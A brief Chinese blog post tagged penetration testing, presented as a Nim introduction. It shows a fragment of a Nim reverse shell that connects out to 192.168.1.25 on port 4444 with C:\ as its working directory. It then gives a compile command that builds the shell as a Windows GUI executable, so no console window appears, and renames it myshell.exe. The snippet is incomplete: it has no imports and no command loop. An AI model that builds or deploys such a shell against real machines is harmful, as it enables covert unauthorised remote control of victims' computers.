---
title: Nim入门
date: 2024-01-13 20:29:00
tags: 渗透测试
mathjax: true
---

# Nim入门

## 配置

按照实际情况配置IP及端口，保存文件为nimshell.nim。

```
var
    targetIP="192.168.1.25"
    targetPort="4444"
let
    exitMessage="Exiting.."
    changeDirectoryCommand="cd"
    defaultDirectory="C:\\"
try:
    socket.connect(targetIP,Port(parseInt(targetPort)))
```

## 编译

```bash
nim c -d:mingw --app:gui nimshell.nim && mv nimshell.exe myshell.exe
```
